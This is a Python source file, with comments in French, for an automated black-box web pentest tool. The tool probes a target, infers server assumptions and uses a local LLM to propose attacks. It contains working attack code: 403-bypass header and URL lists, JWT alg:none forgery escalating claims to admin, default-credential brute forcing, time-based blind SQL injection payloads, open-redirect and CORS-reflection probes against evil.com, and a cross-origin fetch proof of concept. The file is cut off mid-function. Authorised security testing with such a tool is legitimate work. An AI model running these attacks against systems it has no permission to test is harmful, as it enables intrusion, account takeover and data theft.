"""
BELIEF — HTTP Belief Engine (Phase 2)

Applique le framework BELIEF au pentest black-box :
  1. Observe le comportement HTTP du serveur
  2. Extrait les "croyances implicites" du serveur (ce qu'il suppose être vrai)
  3. Génère des hypothèses d'attaque via LLM (contradictions possibles)
  4. Teste les contradictions → trouve des 0-days logiques

Contrairement au scanner basique (pattern matching),
ce module raisonne comme un auditeur humain.

Usage :
    python3 belief_http_engine.py https://target.com http://OLLAMA_IP:11434
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import re
import sys
import time
import logging
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional
from datetime import datetime

import httpx
import urllib3
urllib3.disable_warnings()

logger = logging.getLogger("belief.http")
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s \033[90m[%(name)s]\033[0m %(message)s"
)

OLLAMA_DEFAULT = "http://localhost:11434"
MODEL_DEFAULT  = "qwen2.5:14b-instruct-q4_K_M"


# ─────────────────────────────────────────────────────────────────────────────
#  Modèles de données BELIEF appliqués au HTTP
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class HttpBelief:
    """
    Une croyance implicite du serveur web, extraite de son comportement HTTP.
    Équivalent BELIEF des sextuplets P,S,C,D,E,L — mais pour le réseau.

    Exemple :
        predicate  = "path=/admin est protégé par authentification"
        evidence   = "HTTP 403 (pas 404) retourné"
        assumption = "le serveur croit que 403 = accès bloqué définitivement"
        attack_hyp = "tester X-Forwarded-For: 127.0.0.1 pour bypass"
    """
    predicate:   str       # Ce que le serveur suppose être vrai
    evidence:    str       # Preuve observée (réponse HTTP)
    confidence:  float     # 0.0 → 1.0
    attack_hyp:  str       # Hypothèse d'attaque générée
    category:    str       # auth / injection / logic / crypto / config
    endpoint:    str       # URL concernée
    severity:    str = "medium"
    tested:      bool = False
    confirmed:   bool = False
    poc:         str = ""


@dataclass
class BehaviorObservation:
    """Observation comportementale brute d'un endpoint."""
    url:           str
    method:        str
    status:        int
    response_time: float   # secondes
    content_type:  str
    body_size:     int
    body_hash:     str     # SHA256 des 2KB de body
    headers:       dict
    body_snippet:  str     # 1000 premiers chars
    cookies:       dict
    redirects:     list    # chaîne de redirections


@dataclass 
class ConfirmedVuln:
    """Vulnérabilité confirmée avec preuve d'exploitation."""
    severity:    str
    type:        str
    url:         str
    belief:      str       # La croyance du serveur qui était fausse
    proof:       str       # Preuve concrète
    poc:         str       # Commande curl / code Python reproductible
    cwe:         str
    cvss:        float
    fix:         str


# ─────────────────────────────────────────────────────────────────────────────
#  Extracteur de croyances HTTP
# ─────────────────────────────────────────────────────────────────────────────

class HttpBeliefExtractor:
    """
    Extrait des croyances implicites à partir d'observations HTTP.

    Logique : chaque comportement serveur révèle une hypothèse implicite.
    Si on peut trouver une entrée qui invalide cette hypothèse → vuln.
    """

    def extract(self, obs: BehaviorObservation) -> list[HttpBelief]:
        beliefs = []
        beliefs.extend(self._analyze_403_vs_404(obs))
        beliefs.extend(self._analyze_cookies(obs))
        beliefs.extend(self._analyze_auth_headers(obs))
        beliefs.extend(self._analyze_error_disclosure(obs))
        beliefs.extend(self._analyze_cors(obs))
        beliefs.extend(self._analyze_timing(obs))
        beliefs.extend(self._analyze_redirects(obs))
        beliefs.extend(self._analyze_content_type(obs))
        return beliefs

    def _analyze_403_vs_404(self, obs: BehaviorObservation) -> list[HttpBelief]:
        """
        403 ≠ 404 : le serveur sait que la ressource existe mais bloque l'accès.
        Croyance : "le mécanisme de contrôle d'accès est fiable"
        Contradiction possible : header spoofing, méthode HTTP alternative
        """
        if obs.status != 403:
            return []
        return [HttpBelief(
            predicate=f"L'accès à {obs.url} est bloqué de façon fiable",
            evidence=f"HTTP 403 (ressource connue du serveur, pas 404)",
            confidence=0.8,
            attack_hyp=(
                "Le contrôle d'accès est probablement dans un middleware. "
                "Tester : X-Forwarded-For:127.0.0.1, X-Real-IP:127.0.0.1, "
                "X-Custom-IP-Authorization:127.0.0.1, X-Originating-IP:127.0.0.1, "
                "méthode HEAD/OPTIONS/TRACE, double slash //admin, "
                "encoding URL /%61dmin, extension .json/.xml"
            ),
            category="auth",
            endpoint=obs.url,
            severity="high",
        )]

    def _analyze_cookies(self, obs: BehaviorObservation) -> list[HttpBelief]:
        beliefs = []
        for name, value in obs.cookies.items():
            # Cookie sans httpOnly/Secure
            if not any(x in obs.headers.get("set-cookie","").lower() 
                       for x in ["httponly", "secure"]):
                beliefs.append(HttpBelief(
                    predicate=f"Cookie '{name}' est protégé contre le vol",
                    evidence=f"Set-Cookie sans HttpOnly/Secure flags",
                    confidence=0.9,
                    attack_hyp="Cookie volable via XSS → session hijacking",
                    category="auth",
                    endpoint=obs.url,
                    severity="medium",
                ))

            # Détecter JWT
            if self._looks_like_jwt(value):
                payload = self._decode_jwt_payload(value)
                beliefs.append(HttpBelief(
                    predicate=f"JWT dans cookie '{name}' est cryptographiquement sûr",
                    evidence=f"JWT détecté : {value[:40]}...",
                    confidence=0.85,
                    attack_hyp=(
                        f"Tester alg:none (supprimer signature). "
                        f"Payload décodé : {payload}. "
                        f"Chercher: role, admin, id, exp. "
                        f"Tester modification de claims."
                    ),
                    category="crypto",
                    endpoint=obs.url,
                    severity="critical",
                ))

            # Cookie d'auth lisible en base64
            if self._looks_like_base64_auth(name, value):
                beliefs.append(HttpBelief(
                    predicate=f"Cookie '{name}' contient des données opaques sûres",
                    evidence=f"Valeur base64 décodée : {self._try_decode_b64(value)}",
                    confidence=0.7,
                    attack_hyp="Modifier la valeur décodée (ex: role=admin) et ré-encoder",
                    category="auth",
                    endpoint=obs.url,
                    severity="high",
                ))

        return beliefs

    def _analyze_auth_headers(self, obs: BehaviorObservation) -> list[HttpBelief]:
        beliefs = []
        auth = obs.headers.get("www-authenticate", "")
        if "basic" in auth.lower():
            beliefs.append(HttpBelief(
                predicate="L'authentification Basic est sécurisée",
                evidence=f"WWW-Authenticate: {auth}",
                confidence=0.95,
                attack_hyp=(
                    "Brute-force avec wordlists courantes : admin:admin, "
                    "admin:password, admin:123456, test:test. "
                    "Vérifier si credentials par défaut acceptés."
                ),
                category="auth",
                endpoint=obs.url,
                severity="high",
            ))
        return beliefs

    def _analyze_error_disclosure(self, obs: BehaviorObservation) -> list[HttpBelief]:
        """Erreurs qui révèlent des informations internes."""
        beliefs = []
        body = obs.body_snippet.lower()

        # Stack traces
        stack_patterns = [
            ("traceback", "Python stack trace"),
            ("at com.", "Java stack trace"),
            ("system.exception", ".NET exception"),
            ("fatal error", "PHP fatal error"),
            ("undefined variable", "PHP notice"),
            ("sqlexception", "SQL exception"),
            ("mysqli_", "PHP/MySQL info"),
            ("/var/www", "Chemin serveur Unix"),
            ("c:\\inetpub", "Chemin serveur Windows"),
            ("internal server error", "Erreur 500"),
        ]
        for pattern, desc in stack_patterns:
            if pattern in body:
                beliefs.append(HttpBelief(
                    predicate="Les erreurs internes ne fuient pas d'info sensible",
                    evidence=f"{desc} détecté dans la réponse",
                    confidence=0.95,
                    attack_hyp=(
                        "Les stack traces révèlent la structure interne. "
                        "Tenter des payloads qui déclenchent plus d'erreurs. "
                        "Chercher chemins de fichiers, noms de classes, versions."
                    ),
                    category="config",
                    endpoint=obs.url,
                    severity="medium",
                ))
                break

        return beliefs

    def _analyze_cors(self, obs: BehaviorObservation) -> list[HttpBelief]:
        beliefs = []
        acao = obs.headers.get("access-control-allow-origin", "")
        acac = obs.headers.get("access-control-allow-credentials", "")

        if acao == "*" and "true" in acac.lower():
            beliefs.append(HttpBelief(
                predicate="CORS wildcard avec credentials est sécurisé",
                evidence=f"ACAO:* + ACAC:true — navigateurs bloquent normalement, mais...",
                confidence=0.6,
                attack_hyp="Tester si l'origine est reflétée dynamiquement (Origin: evil.com → ACAO: evil.com)",
                category="config",
                endpoint=obs.url,
                severity="high",
            ))

        if acao and acao != "*":
            # CORS avec origine reflétée dynamiquement
            beliefs.append(HttpBelief(
                predicate=f"CORS restreint à {acao} est correctement validé",
                evidence=f"Access-Control-Allow-Origin: {acao}",
                confidence=0.6,
                attack_hyp=(
                    f"Tester si le domaine est validé par prefix/suffix : "
                    f"evil-{acao}, {acao}.evil.com, null"
                ),
                category="config",
                endpoint=obs.url,
                severity="medium",
            ))

        return beliefs

    def _analyze_timing(self, obs: BehaviorObservation) -> list[HttpBelief]:
        """Temps de réponse anormal → injection temporelle possible."""
        if obs.response_time > 3.0:
            return [HttpBelief(
                predicate="Le temps de traitement est constant (pas de timing attack)",
                evidence=f"Réponse en {obs.response_time:.1f}s — anormalement lent",
                confidence=0.5,
                attack_hyp=(
                    "Tester SQL injection temporelle : SLEEP(5), WAITFOR DELAY, pg_sleep(5). "
                    "Tester SSRF vers hosts internes lents. "
                    "Comparer temps avec/sans payload."
                ),
                category="injection",
                endpoint=obs.url,
                severity="medium",
            )]
        return []

    def _analyze_redirects(self, obs: BehaviorObservation) -> list[HttpBelief]:
        """Open redirect : redirection vers URL externe non validée."""
        if not obs.redirects:
            return []
        for r in obs.redirects:
            loc = r.get("location", "")
            if loc and not any(obs.url.split("/")[2] in loc for _ in [1]):
                return [HttpBelief(
                    predicate="Les redirections sont limitées au domaine courant",
                    evidence=f"Redirection vers : {loc}",
                    confidence=0.7,
                    attack_hyp=(
                        "Open redirect potentiel. Tester avec ?next=https://evil.com, "
                        "?redirect=//evil.com, ?url=https://evil.com. "
                        "Utilisable pour phishing ou vol de tokens OAuth."
                    ),
                    category="logic",
                    endpoint=obs.url,
                    severity="medium",
                )]
        return []

    def _analyze_content_type(self, obs: BehaviorObservation) -> list[HttpBelief]:
        """API JSON sans vérification Content-Type → CSRF possible."""
        beliefs = []
        if "json" in obs.content_type and obs.method == "POST":
            beliefs.append(HttpBelief(
                predicate="L'API JSON vérifie le Content-Type pour prévenir CSRF",
                evidence=f"API JSON sans token CSRF visible (Content-Type: {obs.content_type})",
                confidence=0.5,
                attack_hyp=(
                    "Tester CSRF : envoyer requête POST avec Content-Type:text/plain "
                    "ou depuis un formulaire HTML. Si accepté → CSRF vuln."
                ),
                category="logic",
                endpoint=obs.url,
                severity="medium",
            ))
        return beliefs

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _looks_like_jwt(self, value: str) -> bool:
        parts = value.split(".")
        return len(parts) == 3 and all(len(p) > 10 for p in parts)

    def _decode_jwt_payload(self, jwt: str) -> str:
        try:
            payload_b64 = jwt.split(".")[1]
            payload_b64 += "=" * (4 - len(payload_b64) % 4)
            decoded = base64.urlsafe_b64decode(payload_b64).decode("utf-8", errors="replace")
            return decoded[:200]
        except Exception:
            return "décodage impossible"

    def _looks_like_base64_auth(self, name: str, value: str) -> bool:
        auth_names = ["auth", "session", "token", "user", "id", "key"]
        if not any(x in name.lower() for x in auth_names):
            return False
        try:
            decoded = base64.b64decode(value + "==").decode("utf-8", errors="replace")
            return any(x in decoded.lower() for x in [":", "admin", "user", "id", "{", "="])
        except Exception:
            return False

    def _try_decode_b64(self, value: str) -> str:
        try:
            return base64.b64decode(value + "==").decode("utf-8", errors="replace")[:100]
        except Exception:
            return value[:50]


# ─────────────────────────────────────────────────────────────────────────────
#  Testeurs de contradictions (frontier testing)
# ─────────────────────────────────────────────────────────────────────────────

class BeliefContradictionTester:
    """
    Pour chaque croyance extraite, tente de la contredire.
    C'est l'équivalent HTTP du ConflictDetector de BELIEF.
    """

    BYPASS_HEADERS = [
        ("X-Forwarded-For",         "127.0.0.1"),
        ("X-Real-IP",               "127.0.0.1"),
        ("X-Originating-IP",        "127.0.0.1"),
        ("X-Remote-IP",             "127.0.0.1"),
        ("X-Client-IP",             "127.0.0.1"),
        ("X-Custom-IP-Authorization","127.0.0.1"),
        ("X-Forwarded-Host",        "localhost"),
        ("X-Host",                  "localhost"),
        ("X-Original-URL",          "/admin"),
        ("X-Rewrite-URL",           "/admin"),
        ("X-Override-URL",          "/admin"),
        ("Referer",                 "https://localhost/admin"),
        ("True-Client-IP",          "127.0.0.1"),
        ("CF-Connecting-IP",        "127.0.0.1"),
    ]

    URL_BYPASS_VARIANTS = [
        "/{path}",
        "/{path}/",
        "//{path}",
        "/{PATH}",
        "/%2e/{path}",
        "/{path}%20",
        "/{path}?",
        "/{path}.json",
        "/{path}.xml",
        "/{path};/",
        "/{path}#",
        "/./{ path}",
    ]

    BLIND_SQLI = [
        ("AND SLEEP(3)--",          3.0, "MySQL time-based"),
        ("AND pg_sleep(3)--",       3.0, "PostgreSQL time-based"),
        ("WAITFOR DELAY '0:0:3'--", 3.0, "MSSQL time-based"),
        ("AND 1=1--",               None, "Boolean true"),
        ("AND 1=2--",               None, "Boolean false"),
        ("' AND '1'='1",            None, "String boolean true"),
        ("' AND '1'='2",            None, "String boolean false"),
    ]

    def __init__(self, http: httpx.Client, delay: float = 0.3):
        self.http = http
        self.delay = delay
        self.req_count = 0

    def test_belief(self, belief: HttpBelief, 
                    base_obs: BehaviorObservation) -> Optional[ConfirmedVuln]:
        """Tente de contredire une croyance. Retourne une vuln confirmée ou None."""

        if belief.category == "auth" and "403" in belief.evidence:
            return self._test_403_bypass(belief, base_obs)
        elif belief.category == "crypto" and "JWT" in belief.evidence:
            return self._test_jwt_none_alg(belief)
        elif belief.category == "auth" and "Basic" in belief.evidence:
            return self._test_basic_auth_defaults(belief)
        elif belief.category == "injection" and "lent" in belief.evidence:
            return self._test_blind_sqli(belief, base_obs)
        elif belief.category == "logic" and "Open redirect" in belief.attack_hyp:
            return self._test_open_redirect(belief)
        elif belief.category == "config" and "CORS" in belief.predicate:
            return self._test_cors_reflection(belief)

        return None

    def _get(self, url: str, headers: dict = None, 
             params: dict = None, follow_redirects: bool = True,
             stay_on_host: str = None) -> Optional[httpx.Response]:
        try:
            time.sleep(self.delay)
            if stay_on_host:
                # Ne pas suivre les redirections qui sortent du domaine cible
                r = self.http.get(url, headers=headers or {}, params=params,
                                  follow_redirects=False)
                self.req_count += 1
                # Si redirect, vérifier qu'on reste sur le bon host
                if r.status_code in (301, 302, 303, 307, 308):
                    loc = r.headers.get("location", "")
                    loc_host = urllib.parse.urlparse(loc).netloc
                    if loc_host and loc_host != stay_on_host:
                        return None  # sort du domaine → ignorer
                return r
            else:
                r = self.http.get(url, headers=headers or {}, params=params,
                                  follow_redirects=follow_redirects)
                self.req_count += 1
                return r
        except Exception as e:
            logger.debug(f"Request failed: {e}")
            return None

    def _test_403_bypass(self, belief: HttpBelief, 
                         base_obs: BehaviorObservation) -> Optional[ConfirmedVuln]:
        url = belief.endpoint
        parsed_url = urllib.parse.urlparse(url)
        path = parsed_url.path
        target_host = parsed_url.netloc

        # 1. Header-based bypass — ne pas suivre les redirections hors domaine
        for header_name, header_val in self.BYPASS_HEADERS:
            r = self._get(url, headers={header_name: header_val},
                          stay_on_host=target_host)
            if r is None:
                continue
            # Vérifier qu'on est bien resté sur le host cible
            if r.status_code == 200 and len(r.content) > 100:
                # S'assurer que la réponse finale vient bien du host cible
                final_url = str(r.url) if hasattr(r, 'url') else url
                final_host = urllib.parse.urlparse(final_url).netloc
                if target_host not in final_host and final_host != target_host:
                    continue
                return ConfirmedVuln(
                    severity="critical",
                    type="403 Bypass via Header Injection",
                    url=url,
                    belief=belief.predicate,
                    proof=(
                        f"HTTP 403 → HTTP 200 avec header "
                        f"{header_name}: {header_val}\n"
                        f"Taille réponse: {len(r.content)} bytes\n"
                        f"Extrait: {r.text[:200]}"
                    ),
                    poc=f'curl -H "{header_name}: {header_val}" {url}',
                    cwe="CWE-290",
                    cvss=9.1,
                    fix="Ne pas faire confiance aux headers X-Forwarded-For pour les décisions de contrôle d'accès",
                )

        # 2. URL variant bypass — rester sur le même host
        base = urllib.parse.urlparse(url)
        clean_path = path.lstrip("/")
        for variant_tpl in self.URL_BYPASS_VARIANTS:
            variant_path = variant_tpl.replace("{path}", clean_path).replace("{PATH}", clean_path.upper())
            variant_url = f"{base.scheme}://{base.netloc}{variant_path}"
            r = self._get(variant_url, stay_on_host=target_host)
            if r and r.status_code == 200 and len(r.content) > 100:
                return ConfirmedVuln(
                    severity="critical",
                    type="403 Bypass via URL Normalization",
                    url=url,
                    belief=belief.predicate,
                    proof=f"HTTP 403 sur {url} → HTTP 200 sur {variant_url}",
                    poc=f"curl '{variant_url}'",
                    cwe="CWE-863",
                    cvss=8.8,
                    fix="Normaliser les URLs avant le contrôle d'accès",
                )

        # 3. HTTP method bypass
        for method in ["HEAD", "OPTIONS", "TRACE", "PUT", "PATCH"]:
            try:
                time.sleep(self.delay)
                r = self.http.request(method, url)
                self.req_count += 1
                if r and r.status_code == 200:
                    return ConfirmedVuln(
                        severity="high",
                        type="403 Bypass via HTTP Method",
                        url=url,
                        belief=belief.predicate,
                        proof=f"HTTP 403 sur GET → HTTP 200 sur {method}",
                        poc=f"curl -X {method} '{url}'",
                        cwe="CWE-650",
                        cvss=7.5,
                        fix="Appliquer le contrôle d'accès sur toutes les méthodes HTTP",
                    )
            except Exception:
                pass

        return None

    def _test_jwt_none_alg(self, belief: HttpBelief) -> Optional[ConfirmedVuln]:
        """Test JWT alg:none — le serveur croit que la signature est toujours vérifiée."""
        # Extraire le JWT de l'evidence
        jwt_match = re.search(r'(ey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)', 
                               belief.evidence)
        if not jwt_match:
            return None

        original_jwt = jwt_match.group(1)
        parts = original_jwt.split(".")

        try:
            # Modifier header : alg → none
            header_decoded = base64.urlsafe_b64decode(parts[0] + "==").decode()
            header_json = json.loads(header_decoded)
            header_json["alg"] = "none"
            new_header = base64.urlsafe_b64encode(
                json.dumps(header_json, separators=(',',':')).encode()
            ).rstrip(b"=").decode()

            # Modifier payload : ajouter admin si possible
            try:
                payload_decoded = base64.urlsafe_b64decode(parts[1] + "==").decode()
                payload_json = json.loads(payload_decoded)
                # Tenter escalade de privilèges
                for key in ["role", "admin", "is_admin", "group", "type", "level"]:
                    if key in payload_json:
                        payload_json[key] = "admin" if isinstance(payload_json[key], str) else True
                new_payload = base64.urlsafe_b64encode(
                    json.dumps(payload_json, separators=(',',':')).encode()
                ).rstrip(b"=").decode()
            except Exception:
                new_payload = parts[1]

            # JWT forgé : signature vide
            forged_jwt = f"{new_header}.{new_payload}."

            return ConfirmedVuln(
                severity="critical",
                type="JWT None Algorithm Attack",
                url=belief.endpoint,
                belief=belief.predicate,
                proof=(
                    f"JWT forgé avec alg:none généré.\n"
                    f"Original : {original_jwt[:60]}...\n"
                    f"Forgé    : {forged_jwt[:80]}...\n"
                    f"Tester en remplaçant le cookie/header Authorization"
                ),
                poc=(
                    f"# Python — forger le JWT\n"
                    f"forged = '{forged_jwt}'\n"
                    f"# curl avec le JWT forgé\n"
                    f"curl -H 'Authorization: Bearer {forged_jwt}' {belief.endpoint}\n"
                    f"# OU dans cookie\n"
                    f"curl --cookie 'token={forged_jwt}' {belief.endpoint}"
                ),
                cwe="CWE-347",
                cvss=9.8,
                fix="Vérifier explicitement l'algorithme JWT. Rejeter alg:none. Utiliser une liste blanche d'algos.",
            )
        except Exception as e:
            logger.debug(f"JWT forge failed: {e}")
            return None

    def _test_basic_auth_defaults(self, belief: HttpBelief) -> Optional[ConfirmedVuln]:
        """Test credentials par défaut sur auth Basic."""
        DEFAULT_CREDS = [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("admin", ""), ("root", "root"), ("test", "test"),
            ("admin", "admin123"), ("administrator", "administrator"),
            ("guest", "guest"), ("user", "user"),
        ]
        url = belief.endpoint
        for user, pwd in DEFAULT_CREDS:
            try:
                time.sleep(self.delay)
                r = self.http.get(url, auth=(user, pwd))
                self.req_count += 1
                if r and r.status_code == 200:
                    return ConfirmedVuln(
                        severity="critical",
                        type="Default Credentials",
                        url=url,
                        belief=belief.predicate,
                        proof=f"Authentification réussie avec {user}:{pwd}",
                        poc=f"curl -u '{user}:{pwd}' '{url}'",
                        cwe="CWE-1392",
                        cvss=9.8,
                        fix="Changer immédiatement les credentials par défaut",
                    )
            except Exception:
                pass
        return None

    def _test_blind_sqli(self, belief: HttpBelief,
                          base_obs: BehaviorObservation) -> Optional[ConfirmedVuln]:
        """Injection SQL aveugle par timing."""
        url = belief.endpoint
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if not params:
            return None

        # Pour chaque paramètre, tester timing
        for param in list(params.keys())[:3]:
            for payload, expected_delay, desc in self.BLIND_SQLI[:3]:
                if expected_delay is None:
                    continue
                test_params = dict(params)
                test_params[param] = str(params[param]) + payload
                t0 = time.time()
                r = self._get(url, params=test_params)
                elapsed = time.time() - t0

                if r and elapsed >= expected_delay * 0.8:
                    poc_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    test_params_str = "&".join(f"{k}={urllib.parse.quote(str(v))}" 
                                               for k, v in test_params.items())
                    return ConfirmedVuln(
                        severity="critical",
                        type=f"SQL Injection Blind (Time-Based) — {desc}",
                        url=url,
                        belief=belief.predicate,
                        proof=(
                            f"Param: {param}\nPayload: {payload}\n"
                            f"Temps normal: {base_obs.response_time:.2f}s\n"
                            f"Temps avec payload: {elapsed:.2f}s\n"
                            f"Délai induit: {elapsed - base_obs.response_time:.2f}s"
                        ),
                        poc=f"curl '{poc_url}?{test_params_str}'",
                        cwe="CWE-89",
                        cvss=9.8,
                        fix="Utiliser des requêtes paramétrées. Ne jamais concaténer l'input dans SQL.",
                    )
        return None

    def _test_open_redirect(self, belief: HttpBelief) -> Optional[ConfirmedVuln]:
        """Test open redirect sur les paramètres de redirection."""
        url = belief.endpoint
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))

        redirect_params = [k for k in params 
                           if any(x in k.lower() 
                                  for x in ["next", "url", "redirect", "return", "goto", "dest", "to"])]

        evil_urls = [
            "https://evil.com",
            "//evil.com",
            "https://evil.com%2F@legitimate.com",
        ]
        for param in redirect_params[:3]:
            for evil in evil_urls:
                test_params = dict(params)
                test_params[param] = evil
                # Ne pas follow redirect pour voir la Location
                try:
                    r = self.http.get(url, params=test_params, follow_redirects=False)
                    self.req_count += 1
                    loc = r.headers.get("location", "")
                    if "evil.com" in loc:
                        return ConfirmedVuln(
                            severity="medium",
                            type="Open Redirect",
                            url=url,
                            belief=belief.predicate,
                            proof=f"Location: {loc}",
                            poc=f"curl -v '{url}?{param}={urllib.parse.quote(evil)}'",
                            cwe="CWE-601",
                            cvss=6.1,
                            fix="Valider les URLs de redirection avec une liste blanche de domaines autorisés",
                        )
                except Exception:
                    pass
        return None

    def _test_cors_reflection(self, belief: HttpBelief) -> Optional[ConfirmedVuln]:
        """Test si l'origine est reflétée dynamiquement (CORS misconfiguration critique)."""
        url = belief.endpoint
        for evil_origin in ["https://evil.com", "null", f"https://evil-{urllib.parse.urlparse(url).netloc}"]:
            try:
                r = self.http.get(url, headers={"Origin": evil_origin})
                self.req_count += 1
                acao = r.headers.get("access-control-allow-origin", "")
                acac = r.headers.get("access-control-allow-credentials", "")
                if evil_origin in acao and "true" in acac.lower():
                    return ConfirmedVuln(
                        severity="critical",
                        type="CORS Misconfiguration — Origin Reflection",
                        url=url,
                        belief=belief.predicate,
                        proof=(
                            f"Origin: {evil_origin} → "
                            f"Access-Control-Allow-Origin: {acao}\n"
                            f"Access-Control-Allow-Credentials: {acac}\n"
                            f"N'importe quel domaine peut lire les réponses authentifiées !"
                        ),
                        poc=(
                            f"# Depuis evil.com :\n"
                            f"fetch('{url}', {{credentials:'include'}})"
                            f".then(r=>r.text()).then(console.log)"
                        ),
                        cwe="CWE-942",
                        cvss=9.1,
                        fix="Ne jamais refléter l'en-tête Origin. Utiliser une liste blanche explicite.",
                    )
            except Exception:
                pass
        return None


# ─────────────────────────────────────────────────────────────────────────────
#  Orchestrateur LLM — génération d'hypothèses avancées
# ─────────────────────────────────────────────────────────────────────────────

class LLMHypothesisGenerator:
    """
    Utilise le LLM pour raisonner sur les comportements observés
    et générer des hypothèses d'attaque que les patterns statiques ne peuvent pas voir.
    """

    def __init__(self, ollama_host: str, model: str):
        self.ollama_host = ollama_host
        self.model = model
        self.http = httpx.Client(timeout=120)

    def generate_attack_hypotheses(self, 
                                    observations: list[BehaviorObservation],
                                    beliefs: list[HttpBelief],
                                    tech_stack: list[str]) -> list[dict]:
        """
        Donne au LLM toutes les observations et lui demande de raisonner
        sur les vecteurs d'attaque non-évidents (business logic, chaînes d'exploitation).
        """
        obs_summary = []
        for o in observations[:10]:
            obs_summary.append(
                f"  {o.method} {o.url} → {o.status} "
                f"({o.body_size}B, {o.response_time:.2f}s, {o.content_type})"
            )

        belief_summary = []
        for b in beliefs[:15]:
            belief_summary.append(
                f"  [{b.severity.upper()}][{b.category}] {b.predicate}\n"
                f"    → Hypothèse: {b.attack_hyp[:150]}"
            )

        prompt = f"""Tu es un expert en pentest offensif spécialisé dans la découverte de vulnérabilités logiques et 0-days.

CIBLE : {observations[0].url if observations else 'inconnue'}
TECHNOLOGIES : {', '.join(tech_stack) if tech_stack else 'inconnues'}

COMPORTEMENTS OBSERVÉS :
{chr(10).join(obs_summary)}

CROYANCES IMPLICITES DU SERVEUR DÉJÀ IDENTIFIÉES :
{chr(10).join(belief_summary) if belief_summary else '  Aucune encore identifiée'}

MISSION :
Identifie 3 à 5 vecteurs d'attaque NON-ÉVIDENTS que les scanners automatiques manquent :
- Vulnérabilités de logique métier
- Chaînes d'exploitation combinant plusieurs faiblesses
- Race conditions
- IDOR (Insecure Direct Object Reference)  
- Mass assignment
- Désynchronisation HTTP (HTTP smuggling)
- Injections dans des contextes inattendus

Pour chaque vecteur, donne :
1. La croyance implicite du serveur que tu veux contredire
2. Le test HTTP exact à effectuer (method, URL, headers, body)
3. Ce qui prouve que la vuln est présente dans la réponse

Réponds en JSON strict :
{{
  "hypotheses": [
    {{
      "belief": "...",
      "severity": "critical|high|medium|low",
      "type": "...",
      "test": {{
        "method": "GET|POST|PUT|...",
        "url": "...",
        "headers": {{}},
        "body": "...",
        "params": {{}}
      }},
      "success_indicator": "...",
      "explanation": "..."
    }}
  ]
}}"""

        try:
            r = self.http.post(
                f"{self.ollama_host}/api/generate",
                json={
                    "model": self.model,
                    "prompt": prompt,
                    "stream": False,
                    "options": {"temperature": 0.4, "num_predict": 2000},
                },
            )
            if r.status_code == 200:
                raw = r.json().get("response", "")
                # Extraire le JSON
                json_match = re.search(r'\{[\s\S]*\}', raw)
                if json_match:
                    data = json.loads(json_match.group())
                    return data.get("hypotheses", [])
        except Exception as e:
            logger.error(f"LLM hypothesis generation failed: {e}")

        return []

    def analyze_response_anomaly(self, 
                                  url: str,
                                  baseline: BehaviorObservation,
                                  anomaly: BehaviorObservation,
                                  payload: str) -> str:
        """Demande au LLM d'analyser une réponse anormale."""
        prompt = f"""Analyse cette anomalie de comportement HTTP.

URL : {url}
Payload utilisé : {payload}

RÉPONSE BASELINE (sans payload) :
  Status: {baseline.status}
  Taille: {baseline.body_size} bytes
  Temps: {baseline.response_time:.3f}s
  Extrait: {baseline.body_snippet[:300]}

RÉPONSE AVEC PAYLOAD :
  Status: {anomaly.status}
  Taille: {anomaly.body_size} bytes
  Temps: {anomaly.response_time:.3f}s
  Extrait: {anomaly.body_snippet[:300]}

Cette différence indique-t-elle une vulnérabilité ? Laquelle ? Quelle est la prochaine étape d'exploitation ?
Réponds en max 100 mots, de façon très concrète."""

        try:
            r = self.http.post(
                f"{self.ollama_host}/api/generate",
                json={
                    "model": self.model,
                    "prompt": prompt,
                    "stream": False,
                    "options": {"temperature": 0.2, "num_predict": 300},
                },
            )
            if r.status_code == 200:
                return r.json().get("response", "").strip()
        except Exception:
            pass
        return "Analyse LLM indisponible"

    def close(self):
        self.http.close()


# ─────────────────────────────────────────────────────────────────────────────
#  Moteur principal BELIEF HTTP
# ─────────────────────────────────────────────────────────────────────────────

class BeliefHttpEngine:
    """
    Pipeline complet :
    Observer → Extraire croyances → Générer hypothèses (LLM) → Tester contradictions
    """

    def __init__(self, target: str, ollama_host: str = OLLAMA_DEFAULT,
                 model: str = MODEL_DEFAULT, delay: float = 0.4,
                 max_pages: int = 20):
        self.target = target
        self.ollama_host = ollama_host
        self.model = model
        self.delay = delay
        self.max_pages = max_pages

        parsed = urllib.parse.urlparse(target)
        self.base_host = parsed.netloc
        self.base_url = f"{parsed.scheme}://{parsed.netloc}"

        self.http = httpx.Client(
            timeout=15,
            follow_redirects=True,
            headers={"User-Agent": "Mozilla/5.0 (BELIEF/2.0)"},
            verify=False,
        )

        self.extractor = HttpBeliefExtractor()
        self.tester    = BeliefContradictionTester(self.http, delay=delay)
        self.llm       = LLMHypothesisGenerator(ollama_host, model)

        self.observations: list[BehaviorObservation] = []
        self.beliefs:      list[HttpBelief] = []
        self.vulns:        list[ConfirmedVuln] = []
        self.tech_stack:   list[str] = []

    # ── Observation ───────────────────────────────────────────────────────────

    def _observe(self, url: str, method: str = "GET",
                 headers: dict = None, body: dict = None) -> Optional[BehaviorObservation]:
        try:
            time.sleep(self.delay)
            t0 = time.time()
            if method == "GET":
                r = self.http.get(url, headers=headers or {})
            else:
                r = self.http.request(method, url, data=body or {}, headers=headers or {})
            elapsed = time.time() - t0

            redirects = []
            for h in r.history:
                redirects.append({
                    "status": h.status_code,
                    "location": h.headers.get("location", ""),
                })

            return BehaviorObservation(
                url=url,
                method=method,
                status=r.status_code,
                response_time=elapsed,
                content_type=r.headers.get("content-type", ""),
                body_size=len(r.content),
                body_hash=hashlib.sha256(r.content[:2048]).hexdigest()[:16],
                headers=dict(r.headers),
                body_snippet=r.text[:1000],
                cookies={k: v for k, v in r.cookies.items()},
                redirects=redirects,
            )
        except Exception as e:
            logger.debug(f"Observe failed {url}: {e}")
            return None

    # ── Crawl ─────────────────────────────────────────────────────────────────

    def _crawl(self):
        logger.info(f"[1/4] Observation comportementale de {self.target}")
